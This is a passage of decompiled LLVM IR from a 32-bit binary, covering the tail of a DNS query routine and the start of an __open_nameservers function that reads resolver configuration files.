dec_label_pc_10012d5c:                            ; preds = %dec_label_pc_10012d50
  %v0_10012d5c = load i32, i32* @r31, align 4
  store i32 %v2_10012d18, i32* @r4, align 4
  %v1_10012d64 = add i32 %v0_10012d5c, 28
  %v2_10012d64 = inttoptr i32 %v1_10012d64 to i32*
  %v3_10012d64 = load i32, i32* %v2_10012d64, align 4
  store i32 %v3_10012d64, i32* %r0.global-to-local, align 4
  store i32 %v0_10012d5c, i32* @r3, align 4
  %v1_10012d6c = add i32 %v0_10012d5c, 36
  %v2_10012d6c = inttoptr i32 %v1_10012d6c to i32*
  %v3_10012d6c = load i32, i32* %v2_10012d6c, align 4
  store i32 %v3_10012d6c, i32* %r11.global-to-local, align 4
  store i32 40, i32* @r5, align 4
  store i32 268512644, i32* @lr, align 4
  %v0_10012d80 = call i32 @memcpy()
  %v0_10012d84 = load i32, i32* @r31, align 4
  %v1_10012d84 = add i32 %v0_10012d84, 4
  %v2_10012d84 = inttoptr i32 %v1_10012d84 to i32*
  %v3_10012d84 = load i32, i32* %v2_10012d84, align 4
  %v3_10012d88 = icmp eq i32 %v3_10012d84, 24
  br i1 %v3_10012d88, label %dec_label_pc_10012d5c.dec_label_pc_10012dac_crit_edge, label %dec_label_pc_10012d90

dec_label_pc_10012d5c.dec_label_pc_10012dac_crit_edge: ; preds = %dec_label_pc_10012d5c
  %v1_10012dac.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_10012dac

dec_label_pc_10012d90:                            ; preds = %dec_label_pc_10012d5c
  %v1_10012d90 = add i32 %v0_10012d84, 28
  %v2_10012d90 = inttoptr i32 %v1_10012d90 to i32*
  %v3_10012d90 = load i32, i32* %v2_10012d90, align 4
  store i32 %v3_10012d90, i32* %r0.global-to-local, align 4
  %v3_10012d94 = icmp eq i32 %v3_10012d90, 0
  br i1 %v3_10012d94, label %dec_label_pc_10012e5c, label %dec_label_pc_10012d9c

dec_label_pc_10012d9c:                            ; preds = %dec_label_pc_10012d90
  %v0_10012d9c = load i32, i32* %r16.global-to-local, align 4
  %v3_10012d9c = icmp eq i32 %v0_10012d9c, 1
  br i1 %v3_10012d9c, label %dec_label_pc_10012dac, label %dec_label_pc_10012da4

dec_label_pc_10012da4:                            ; preds = %dec_label_pc_10012d9c
  %v3_10012da4 = icmp eq i32 %v0_10012d9c, 28
  br i1 %v3_10012da4, label %dec_label_pc_10012dac, label %dec_label_pc_10012e5c

dec_label_pc_10012dac:                            ; preds = %dec_label_pc_10012d5c.dec_label_pc_10012dac_crit_edge, %dec_label_pc_10012da4, %dec_label_pc_10012d9c
  %v1_10012dac = phi i32 [ %v1_10012dac.pre, %dec_label_pc_10012d5c.dec_label_pc_10012dac_crit_edge ], [ 28, %dec_label_pc_10012da4 ], [ 1, %dec_label_pc_10012d9c ]
  %v4_10012dac = icmp eq i32 %v3_10012d84, %v1_10012dac
  br i1 %v4_10012dac, label %dec_label_pc_10012dc0, label %dec_label_pc_10012db4

dec_label_pc_10012db4:                            ; preds = %dec_label_pc_10012dac
  %v1_10012db4 = inttoptr i32 %v0_10012d84 to i32*
  %v2_10012db4 = load i32, i32* %v1_10012db4, align 4
  store i32 %v2_10012db4, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10012dbc.712 to i32), i32* @lr, align 4
  %v0_10012db8 = call i32 @free()
  br label %dec_label_pc_10012e40

dec_label_pc_10012dc0:                            ; preds = %dec_label_pc_10012dac
  %v1_10012dc4 = add i32 %v0_10012d84, 16
  %v2_10012dc4 = inttoptr i32 %v1_10012dc4 to i32*
  %v3_10012dc4 = load i32, i32* %v2_10012dc4, align 4
  store i32 %v3_10012dc4, i32* %r11.global-to-local, align 4
  %v0_10012dc8 = load i32, i32* @r24, align 4
  %v2_10012dc8 = sub i32 %tmp35, %v0_10012dc8
  %v1_10012dcc = add i32 %v0_10012d84, 32
  %v2_10012dcc = inttoptr i32 %v1_10012dcc to i32*
  %v3_10012dcc = load i32, i32* %v2_10012dcc, align 4
  store i32 %v3_10012dcc, i32* %r0.global-to-local, align 4
  %v1_10012dd0 = add i32 %v2_10012dc8, -1
  %v1_10012dd4 = add i32 %v3_10012dc4, 4
  %v2_10012dd8 = mul i32 %v1_10012dd0, %v1_10012dd4
  store i32 %v2_10012dd8, i32* %r11.global-to-local, align 4
  %v2_10012ddc = add i32 %v0_10012d84, 36
  %v3_10012ddc = inttoptr i32 %v2_10012ddc to i32*
  store i32 %v1_10012dd0, i32* %v3_10012ddc, align 4
  %v0_10012de0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012de0 = load i32, i32* %r0.global-to-local, align 4
  %v3_10012de0 = icmp ugt i32 %v0_10012de0, %v1_10012de0
  br i1 %v3_10012de0, label %dec_label_pc_10012e5c, label %dec_label_pc_10012de8

dec_label_pc_10012de8:                            ; preds = %dec_label_pc_10012dc0
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10012df0 = load i32, i32* @r31, align 4
  %v2_10012df0 = add i32 %v1_10012df0, 36
  %v3_10012df0 = inttoptr i32 %v2_10012df0 to i32*
  store i32 0, i32* %v3_10012df0, align 4
  br label %dec_label_pc_10012e40

dec_label_pc_10012df8:                            ; preds = %dec_label_pc_10012d50
  %v3_10012df8 = load i32, i32* %stack_var_-184, align 4
  store i32 %v3_10012df8, i32* @r3, align 4
  store i32 268512768, i32* @lr, align 4
  %v0_10012dfc = call i32 @free()
  store i32 %tmp29, i32* %r0.global-to-local, align 4
  %v1_10012e04 = load i32, i32* %r16.global-to-local, align 4
  %v4_10012e04 = icmp eq i32 %tmp29, %v1_10012e04
  br i1 %v4_10012e04, label %dec_label_pc_10012e0c, label %dec_label_pc_10012e40

dec_label_pc_10012e0c:                            ; preds = %dec_label_pc_10012df8
  %v0_10012e0c = load i32, i32* @r31, align 4
  %v1_10012e0c = add i32 %v0_10012e0c, 16
  %v2_10012e0c = inttoptr i32 %v1_10012e0c to i32*
  %v3_10012e0c = load i32, i32* %v2_10012e0c, align 4
  store i32 %v3_10012e0c, i32* @r5, align 4
  store i32 %tmp28, i32* %r0.global-to-local, align 4
  %v4_10012e14 = icmp eq i32 %v3_10012e0c, %tmp28
  br i1 %v4_10012e14, label %dec_label_pc_10012e1c, label %dec_label_pc_10012ea0

dec_label_pc_10012e1c:                            ; preds = %dec_label_pc_10012e0c
  %v1_10012e1c = add i32 %v0_10012e0c, 36
  %v2_10012e1c = inttoptr i32 %v1_10012e1c to i32*
  %v3_10012e1c = load i32, i32* %v2_10012e1c, align 4
  %v1_10012e20 = add i32 %v0_10012e0c, 28
  %v2_10012e20 = inttoptr i32 %v1_10012e20 to i32*
  %v3_10012e20 = load i32, i32* %v2_10012e20, align 4
  store i32 %v3_10012e20, i32* %r0.global-to-local, align 4
  %v2_10012e24 = mul i32 %v3_10012e1c, %tmp28
  %v2_10012e2c = add i32 %v3_10012e20, %v2_10012e24
  store i32 %v2_10012e2c, i32* @r3, align 4
  store i32 268512820, i32* @lr, align 4
  %v0_10012e30 = call i32 @memcpy()
  %v0_10012e34 = load i32, i32* @r31, align 4
  %v1_10012e34 = add i32 %v0_10012e34, 36
  %v2_10012e34 = inttoptr i32 %v1_10012e34 to i32*
  %v3_10012e34 = load i32, i32* %v2_10012e34, align 4
  %v1_10012e38 = add i32 %v3_10012e34, 1
  store i32 %v1_10012e38, i32* %v2_10012e34, align 4
  br label %dec_label_pc_10012e40

dec_label_pc_10012e40:                            ; preds = %dec_label_pc_10012df8, %dec_label_pc_10012de8, %dec_label_pc_10012db4, %dec_label_pc_10012e1c
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_10012e1c ], [ 0, %dec_label_pc_10012df8 ], [ 0, %dec_label_pc_10012de8 ], [ %stack_var_-88.118, %dec_label_pc_10012db4 ]
  %v0_10012e40 = load i32, i32* @r28, align 4
  %v1_10012e40 = load i32, i32* %r15.global-to-local, align 4
  %v2_10012e40 = add i32 %v1_10012e40, %v0_10012e40
  store i32 %v2_10012e40, i32* %r28.global-to-local, align 4
  %v0_10012e44 = load i32, i32* @r24, align 4
  %v1_10012e44 = add i32 %v0_10012e44, 1
  store i32 %v1_10012e44, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  %v2_10012e4c = icmp slt i32 %v1_10012e44, %tmp35
  br i1 %v2_10012e4c, label %dec_label_pc_10012e54, label %dec_label_pc_10012e5c

dec_label_pc_10012e54:                            ; preds = %dec_label_pc_10012d08, %dec_label_pc_10012e40
  %v0_10012d20 = phi i32 [ %v2_10012e40, %dec_label_pc_10012e40 ], [ %v2_10012cec, %dec_label_pc_10012d08 ]
  %stack_var_-88.118 = phi i32 [ %stack_var_-88.0, %dec_label_pc_10012e40 ], [ 1, %dec_label_pc_10012d08 ]
  %v1_10012e54 = load i32, i32* @r27, align 4
  %v2_10012e54 = icmp slt i32 %v0_10012d20, %v1_10012e54
  br i1 %v2_10012e54, label %dec_label_pc_10012d18, label %dec_label_pc_10012e5c

dec_label_pc_10012e5c:                            ; preds = %dec_label_pc_10012d40, %dec_label_pc_10012d08, %dec_label_pc_10012e54, %dec_label_pc_10012d90, %dec_label_pc_10012dc0, %dec_label_pc_10012e40, %dec_label_pc_10012da4
  %v0_10012e5c = load i32, i32* @r19, align 4
  store i32 268512868, i32* @lr, align 4
  %v1_10012e60 = call i32 @__libc_close(i32 %v0_10012e5c)
  %v3_10012e68 = icmp eq i32 %arg5, 0
  %v0_10012e78 = load i32, i32* @r30, align 4
  br i1 %v3_10012e68, label %dec_label_pc_10012e78, label %dec_label_pc_10012e70

dec_label_pc_10012e70:                            ; preds = %dec_label_pc_10012e5c
  %v2_10012e70 = inttoptr i32 %arg5 to i32*
  store i32 %v0_10012e78, i32* %v2_10012e70, align 4
  br label %dec_label_pc_10012e80

dec_label_pc_10012e78:                            ; preds = %dec_label_pc_10012e5c
  store i32 %v0_10012e78, i32* @r3, align 4
  store i32 268512896, i32* @lr, align 4
  %v0_10012e7c = call i32 @free()
  br label %dec_label_pc_10012e80

dec_label_pc_10012e80:                            ; preds = %dec_label_pc_10012e70, %dec_label_pc_10012e78
  %v0_10012e80 = load i32, i32* @r21, align 4
  store i32 %v0_10012e80, i32* @r3, align 4
  store i32 268632064, i32* %r29.global-to-local, align 4
  store i32 268512908, i32* @lr, align 4
  %v0_10012e88 = call i32 @free()
  store i32 ptrtoint (i32* @global_var_1002ea78.700 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10012f84

dec_label_pc_10012ea0:                            ; preds = %dec_label_pc_10012e0c
  %v1_10012ea0 = inttoptr i32 %v0_10012e0c to i32*
  %v2_10012ea0 = load i32, i32* %v1_10012ea0, align 4
  store i32 %v2_10012ea0, i32* @r3, align 4
  store i32 268512936, i32* @lr, align 4
  %v0_10012ea4 = call i32 @free()
  br label %dec_label_pc_10012ea8

dec_label_pc_10012ea8:                            ; preds = %dec_label_pc_10012cb8, %dec_label_pc_10012c20, %dec_label_pc_10012d40, %dec_label_pc_10012d38, %dec_label_pc_10012c38, %dec_label_pc_10012c00, %dec_label_pc_10012ea0
  %v0_10012ea8 = load i32, i32* %r17.global-to-local, align 4
  %v3_10012ea8 = icmp eq i32 %v0_10012ea8, 0
  br i1 %v3_10012ea8, label %dec_label_pc_10012eb0, label %dec_label_pc_10012f00

dec_label_pc_10012eb0:                            ; preds = %dec_label_pc_10012ea8
  store i32 ptrtoint (i32* @global_var_10028758.649 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_100129b4, i32* %r28.global-to-local, align 4
  store i32 %v2_100129b4, i32* @r3, align 4
  %v0_10012ecc = call i32 @__pthread_return_void()
  %v0_10012ed4 = call i32 @__pthread_return_0()
  %v3_10012edc = load i32, i32* @global_var_10028840.704, align 4
  store i32 %v2_100129b4, i32* @r3, align 4
  %v1_10012ee8 = add i32 %v3_10012edc, -1
  store i32 %v1_10012ee8, i32* %r29.global-to-local, align 4
  %v0_10012eec = call i32 @__pthread_return_void()
  %v0_10012ef0 = load i32, i32* @r22, align 4
  %v2_10012ef0 = icmp slt i32 %v0_10012ef0, %v1_10012ee8
  br i1 %v2_10012ef0, label %dec_label_pc_10012ef8, label %dec_label_pc_10012f00

dec_label_pc_10012ef8:                            ; preds = %dec_label_pc_10012eb0
  %v1_10012ef8 = add i32 %v0_10012ef0, 1
  store i32 %v1_10012ef8, i32* @r22, align 4
  br label %dec_label_pc_10012f1cthread-pre-split.backedge

dec_label_pc_10012f1cthread-pre-split.backedge:   ; preds = %dec_label_pc_10012ef8, %dec_label_pc_10012ca0, %dec_label_pc_10012f18
  %v0_10012f1c.pr = load i32, i32* %r18.global-to-local, align 4
  %tmp65 = icmp ult i32 %v0_10012f1c.pr, 3
  br i1 %tmp65, label %dec_label_pc_10012a10.lr.ph, label %dec_label_pc_10012f34

dec_label_pc_10012f00:                            ; preds = %dec_label_pc_10012bb0, %dec_label_pc_10012eb0, %dec_label_pc_10012ea8, %dec_label_pc_10012bc8
  %v0_10012f00 = load i32, i32* @r26, align 4
  %v1_10012f00 = add i32 %v0_10012f00, 1
  store i32 %v1_10012f00, i32* %r0.global-to-local, align 4
  %v1_10012f04 = load i32, i32* @r23, align 4
  %v2_10012f04 = srem i32 %v1_10012f00, %v1_10012f04
  store i32 %v2_10012f04, i32* @r26, align 4
  %v5_10012f0c = icmp eq i32 %v2_10012f04, 0
  br i1 %v5_10012f0c, label %dec_label_pc_10012f14, label %dec_label_pc_10012f18

dec_label_pc_10012f14:                            ; preds = %dec_label_pc_10012f00
  %v0_10012f14 = load i32, i32* %r18.global-to-local, align 4
  %v1_10012f14 = add i32 %v0_10012f14, 1
  store i32 %v1_10012f14, i32* %r18.global-to-local, align 4
  br label %dec_label_pc_10012f18

dec_label_pc_10012f18:                            ; preds = %dec_label_pc_10012f00, %dec_label_pc_10012f14
  store i32 -1, i32* @r22, align 4
  br label %dec_label_pc_10012f1cthread-pre-split.backedge

dec_label_pc_10012a10.lr.ph:                      ; preds = %dec_label_pc_10012a10.lr.ph.lr.ph, %dec_label_pc_10012f1cthread-pre-split.backedge
  br label %dec_label_pc_10012a10

dec_label_pc_10012f28:                            ; preds = %dec_label_pc_10012988, %dec_label_pc_10012980, %dec_label_pc_10012978, %entry
  store i32 -1, i32* @r19, align 4
  store i32 -1, i32* @r26, align 4
  store i32 -1, i32* @r25, align 4
  br label %dec_label_pc_10012f34

dec_label_pc_10012f34:                            ; preds = %dec_label_pc_10012f1cthread-pre-split.backedge, %dec_label_pc_10012a20, %dec_label_pc_10012afc, %dec_label_pc_10012bc0, %dec_label_pc_10012994, %dec_label_pc_10012f28
  %v0_10012f34 = call i32 @__GI___h_errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10012f3c = inttoptr i32 %v0_10012f34 to i32*
  store i32 -1, i32* %v2_10012f3c, align 4
  %v0_10012f40 = load i32, i32* @r25, align 4
  store i32 %v0_10012f40, i32* @r20, align 4
  br label %dec_label_pc_10012f44

dec_label_pc_10012f44:                            ; preds = %dec_label_pc_10012ce0, %dec_label_pc_10012f34
  %v0_10012f44 = load i32, i32* @r19, align 4
  %v3_10012f44 = icmp eq i32 %v0_10012f44, -1
  br i1 %v3_10012f44, label %dec_label_pc_10012f54, label %dec_label_pc_10012f4c

dec_label_pc_10012f4c:                            ; preds = %dec_label_pc_10012f44
  store i32 268513108, i32* @lr, align 4
  %v1_10012f50 = call i32 @__libc_close(i32 %v0_10012f44)
  br label %dec_label_pc_10012f54

dec_label_pc_10012f54:                            ; preds = %dec_label_pc_10012f44, %dec_label_pc_10012f4c
  %v0_10012f54 = load i32, i32* @r21, align 4
  store i32 %v0_10012f54, i32* @r3, align 4
  store i32 -1, i32* @r27, align 4
  store i32 268513120, i32* @lr, align 4
  %v0_10012f5c = call i32 @free()
  %v0_10012f60 = load i32, i32* @r30, align 4
  store i32 %v0_10012f60, i32* @r3, align 4
  store i32 268513128, i32* @lr, align 4
  %v0_10012f64 = call i32 @free()
  %v0_10012f68 = load i32, i32* @r26, align 4
  %v3_10012f68 = icmp eq i32 %v0_10012f68, -1
  br i1 %v3_10012f68, label %dec_label_pc_10012fb4, label %dec_label_pc_10012f70

dec_label_pc_10012f70:                            ; preds = %dec_label_pc_10012f54
  store i32 ptrtoint (i32* @global_var_1002ea78.700 to i32), i32* %r29.global-to-local, align 4
  %v2_10012f7c = ptrtoint i32* %stack_var_-228 to i32
  br label %dec_label_pc_10012f84

dec_label_pc_10012f84:                            ; preds = %dec_label_pc_10012e80, %dec_label_pc_10012f70
  %storemerge68 = phi i32 [ %v2_10012f7c, %dec_label_pc_10012f70 ], [ %v2_100129b4, %dec_label_pc_10012e80 ]
  %v1_10012f88.pre-phi = phi i32 [ %v2_10012f7c, %dec_label_pc_10012f70 ], [ %v2_100129b4, %dec_label_pc_10012e80 ]
  store i32 %storemerge68, i32* %r28.global-to-local, align 4
  store i32 %v1_10012f88.pre-phi, i32* @r3, align 4
  %v0_10012f8c = call i32 @__pthread_return_void()
  %v0_10012f94 = call i32 @__pthread_return_0()
  %v0_10012f9c = load i32, i32* @r26, align 4
  store i32 %v0_10012f9c, i32* @global_var_10028838.701, align 4
  store i32 %v1_10012f88.pre-phi, i32* @r3, align 4
  %v0_10012fac = load i32, i32* @r20, align 4
  %v1_10012fac = trunc i32 %v0_10012fac to i16
  store i16 %v1_10012fac, i16* @global_var_10028754.702, align 2
  %v0_10012fb0 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10012fb4

dec_label_pc_10012fb4:                            ; preds = %dec_label_pc_10012f54, %dec_label_pc_10012f84
  store i32 %v0_10012934, i32* %r0.global-to-local, align 4
  %v0_10012fb8 = load i32, i32* @r27, align 4
  ret i32 %v0_10012fb8

; uselistorder directives
  uselistorder i32 %v1_10012f88.pre-phi, { 1, 0 }
  uselistorder i32 %v2_10012f04, { 1, 0 }
  uselistorder i32 %v0_10012e78, { 1, 0 }
  uselistorder i32 %v1_10012e54, { 1, 0 }
  uselistorder i32 %stack_var_-88.118, { 1, 0, 2 }
  uselistorder i32 %v0_10012d20, { 1, 0 }
  uselistorder i32 %v1_10012e44, { 1, 0 }
  uselistorder i32 %v0_10012e0c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10012dd0, { 1, 0 }
  uselistorder i32 %v0_10012d5c, { 2, 1, 0 }
  uselistorder i32 %v0_10012cf8, { 1, 0 }
  uselistorder i32 %v2_10012cec, { 0, 2, 1, 3 }
  uselistorder i32 %v4_10012c10, { 1, 0 }
  uselistorder i32 %v1_10012b10, { 1, 0 }
  uselistorder i32 %v1_10012ae4, { 1, 0 }
  uselistorder i32 %v1_10012ab0, { 1, 0 }
  uselistorder i32 %v1_10012a48, { 1, 0 }
  uselistorder i32 %v2_100129b4, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 9, 10, 11, 12 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-212, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-184, { 1, 0, 2 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 %tmp35, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %tmp28, { 0, 2, 1 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %r28.global-to-local, { 0, 2, 3, 5, 4, 1, 6, 7, 8, 9 }
  uselistorder i32* %r18.global-to-local, { 0, 2, 5, 1, 3, 4, 6 }
  uselistorder i32* %r17.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 16, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 2, 17, 0, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 101, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 5, 4, 3, 6, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 8, 7, 6, 5, 4, 3, 2, 9, 0 }
  uselistorder i32 17, { 2, 3, 13, 4, 16, 17, 5, 18, 6, 7, 8, 9, 10, 21, 22, 14, 15, 19, 0, 1, 11, 12, 20 }
  uselistorder i32 (i32)* @inet_addr, { 2, 4, 3, 1, 0 }
  uselistorder i32 53, { 2, 0, 1, 3 }
  uselistorder i16 10, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 1, 0, 3 }
  uselistorder i32 (i32)* @__libc_close, { 16, 15, 14, 17, 25, 24, 23, 22, 21, 20, 19, 18, 13, 12, 11, 10, 9, 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i16* @global_var_10028754.702, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 1, 4, 0 }
  uselistorder i32 512, { 2, 7, 0, 1, 8, 4, 5, 6, 3 }
  uselistorder label %dec_label_pc_10012fb4, { 1, 0 }
  uselistorder label %dec_label_pc_10012f84, { 1, 0 }
  uselistorder label %dec_label_pc_10012f54, { 1, 0 }
  uselistorder label %dec_label_pc_10012f44, { 1, 0 }
  uselistorder label %dec_label_pc_10012f34, { 5, 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_10012a10.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10012f18, { 1, 0 }
  uselistorder label %dec_label_pc_10012f00, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10012f1cthread-pre-split.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012ea8, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_10012e80, { 1, 0 }
  uselistorder label %dec_label_pc_10012e5c, { 2, 5, 4, 6, 3, 0, 1 }
  uselistorder label %dec_label_pc_10012e54, { 1, 0 }
  uselistorder label %dec_label_pc_10012e40, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10012dac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10012ce8, { 1, 0 }
  uselistorder label %dec_label_pc_10012ce0, { 1, 0 }
  uselistorder label %dec_label_pc_10012b84, { 1, 0 }
  uselistorder label %dec_label_pc_10012afc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012a20, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %v2_10012fec = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_10012fec, i32* @r3, align 4
  %v0_10012ff4 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_10028758.649 to i32), i32* %r3.global-to-local, align 4
  %v0_10012ffc = call i32 @__pthread_return_0()
  store i32 %v0_10012ffc, i32* %r3.global-to-local, align 4
  %v3_10013004 = load i32, i32* @global_var_1002883c.650, align 4
  %v2_10013008 = icmp sgt i32 %v3_10013004, 0
  br i1 %v2_10013008, label %dec_label_pc_10013280, label %dec_label_pc_10013010

dec_label_pc_10013010:                            ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_10018190.715 to i32), i32* %r3.global-to-local, align 4
  store i32 268513320, i32* @lr, align 4
  %v3_10013024 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_10018190.715 to i32), i32 ptrtoint (i32* @global_var_100181a4.714 to i32))
  store i32 %v3_10013024, i32* %r3.global-to-local, align 4
  store i32 %v3_10013024, i32* @r26, align 4
  %v3_10013028 = icmp eq i32 %v3_10013024, 0
  br i1 %v3_10013028, label %dec_label_pc_10013030, label %dec_label_pc_10013244.preheader

dec_label_pc_10013030:                            ; preds = %dec_label_pc_10013010
  %v0_10013034 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_100181a8.716 to i32), i32* %r3.global-to-local, align 4
  store i32 268513344, i32* @lr, align 4
  %v3_1001303c = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_100181a8.716 to i32), i32 %v0_10013034)
  store i32 %v3_1001303c, i32* %r3.global-to-local, align 4
  store i32 %v3_1001303c, i32* @r26, align 4
  %v3_10013040 = icmp eq i32 %v3_1001303c, 0
  br i1 %v3_10013040, label %dec_label_pc_10013274, label %dec_label_pc_10013244.preheader

dec_label_pc_10013244.preheader:                  ; preds = %dec_label_pc_10013010, %dec_label_pc_10013030
  %v0_1001325016 = phi i32 [ %v3_10013024, %dec_label_pc_10013010 ], [ %v3_1001303c, %dec_label_pc_10013030 ]
  %v2_10013244 = ptrtoint i32* %stack_var_-164 to i32
  %v1_100130502 = bitcast i32* %stack_var_-164 to i8*
  %v3_10013134 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_10013244

dec_label_pc_1001304c:                            ; preds = %dec_label_pc_10013064
  %v1_1001304c = add i32 %v0_1001310c9, 1
  store i32 %v1_1001304c, i32* %r3.global-to-local, align 4
  %v1_10013050 = inttoptr i32 %v1_1001304c to i8*
  %v2_10013050 = load i8, i8* %v1_10013050, align 1
  %v3_10013050 = zext i8 %v2_10013050 to i32
  store i32 %v3_10013050, i32* %r11.global-to-local, align 4
  %v3_10013058 = icmp eq i8 %v2_10013050, 0
  br i1 %v3_10013058, label %dec_label_pc_10013244.backedge, label %dec_label_pc_10013064

dec_label_pc_10013064:                            ; preds = %dec_label_pc_10013064.lr.ph, %dec_label_pc_1001304c
  %v0_10013068.in = phi i32 [ %v3_100130504, %dec_label_pc_10013064.lr.ph ], [ %v3_10013050, %dec_label_pc_1001304c ]
  %v0_1001307c = phi i32 [ %v3_100130504, %dec_label_pc_10013064.lr.ph ], [ %v3_10013050, %dec_label_pc_1001304c ]
  %v0_1001310c9 = phi i32 [ %v2_10013244, %dec_label_pc_10013064.lr.ph ], [ %v1_1001304c, %dec_label_pc_1001304c ]
  %v0_10013068 = mul nuw nsw i32 %v0_10013068.in, 2
  %v2_10013068 = add i32 %v0_10013068, %v3_10013064.pre
  %v3_10013068 = inttoptr i32 %v2_10013068 to i16*
  %v4_10013068 = load i16, i16* %v3_10013068, align 2
  %v1_1001306c = and i16 %v4_10013068, 32
  %v3_1001306c = icmp eq i16 %v1_1001306c, 0
  br i1 %v3_1001306c, label %dec_label_pc_10013074, label %dec_label_pc_1001304c

dec_label_pc_10013074:                            ; preds = %dec_label_pc_10013064
  %v3_10013074 = icmp eq i32 %v0_1001307c, 10
  br i1 %v3_10013074, label %dec_label_pc_10013244.backedge, label %dec_label_pc_1001307c

dec_label_pc_10013244.backedge:                   ; preds = %dec_label_pc_1001304c, %dec_label_pc_100131f8, %dec_label_pc_10013200, %dec_label_pc_10013238, %dec_label_pc_10013050.preheader, %dec_label_pc_10013074, %dec_label_pc_1001307c, %dec_label_pc_100131a0
  %v0_10013250.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_10013244

dec_label_pc_1001307c:                            ; preds = %dec_label_pc_10013074
  %v3_1001307c = icmp eq i32 %v0_1001307c, 35
  br i1 %v3_1001307c, label %dec_label_pc_10013244.backedge, label %dec_label_pc_10013084

dec_label_pc_10013084:                            ; preds = %dec_label_pc_1001307c
  store i32 0, i32* @r27, align 4
  store i32 %v2_10012fec, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1001310c10 = inttoptr i32 %v0_1001310c9 to i8*
  %v2_1001310c11 = load i8, i8* %v1_1001310c10, align 1
  %v3_1001311014 = icmp eq i8 %v2_1001310c11, 0
  br i1 %v3_1001311014, label %dec_label_pc_10013120, label %dec_label_pc_10013118

dec_label_pc_10013098:                            ; preds = %dec_label_pc_10013118
  %v1_10013098 = mul i32 %v0_10013098, 4
  %v3_1001309c = load i32, i32* @global_var_10028798, align 4
  store i32 %v3_1001309c, i32* %r11.global-to-local, align 4
  %v1_100130a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_100130a0 = add i32 %v1_100130a0, %v1_10013098
  %v2_100130a4 = add i32 %v2_100130a0, 16
  %v3_100130a4 = inttoptr i32 %v2_100130a4 to i32*
  store i32 %v0_100130a4, i32* %v3_100130a4, align 4
  %v0_100130b0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100130b0

dec_label_pc_100130ac:                            ; preds = %dec_label_pc_100130c4
  %v1_100130ac = add i32 %v0_100130ac, 1
  store i32 %v1_100130ac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100130b0

dec_label_pc_100130b0:                            ; preds = %dec_label_pc_10013098, %dec_label_pc_100130ac
  %v0_100130ac = phi i32 [ %v0_100130b0.pre, %dec_label_pc_10013098 ], [ %v1_100130ac, %dec_label_pc_100130ac ]
  %v1_100130b0 = inttoptr i32 %v0_100130ac to i8*
  %v2_100130b0 = load i8, i8* %v1_100130b0, align 1
  %v3_100130b4 = icmp eq i8 %v2_100130b0, 0
  br i1 %v3_100130b4, label %dec_label_pc_100130e0, label %dec_label_pc_100130c4

dec_label_pc_100130c4:                            ; preds = %dec_label_pc_100130b0
  %v3_100130bc = icmp eq i8 %v2_100130b0, 10
  %v3_100130b0 = zext i8 %v2_100130b0 to i32
  %v1_100130b8 = mul nuw nsw i32 %v3_100130b0, 2
  %v1_100130c4 = load i32, i32* %r11.global-to-local, align 4
